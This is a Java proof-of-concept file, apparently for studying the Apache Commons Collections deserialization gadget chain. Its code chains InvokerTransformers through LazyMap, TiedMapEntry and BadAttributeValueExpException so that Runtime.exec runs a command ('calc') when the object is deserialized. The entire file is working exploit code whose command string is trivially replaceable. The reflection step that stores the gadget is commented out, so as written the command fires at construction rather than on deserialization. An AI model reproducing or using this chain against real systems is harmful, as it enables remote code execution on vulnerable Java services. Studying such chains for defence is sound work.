package org.example.apachecommoncollection;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class POC6 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers_exec = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        Transformer chain = new ChainedTransformer(transformers_exec);

        HashMap innerMap = new HashMap();
        innerMap.put("value","axin");

        Map lazyMap = LazyMap.decorate(innerMap,chain);
        // 将lazyMap封装到TiedMapEntry中
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "val");
        // 通过反射给badAttributeValueExpException的val属性赋值
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(tiedMapEntry);
//        Field val = badAttributeValueExpException.getClass().getDeclaredField("val");
//        val.setAccessible(true);
//        val.set(badAttributeValueExpException, tiedMapEntry);
        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(badAttributeValueExpException);
        oos.flush();
        oos.close();
        // 本地模拟反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object obj = (Object) ois.readObject();
    }
}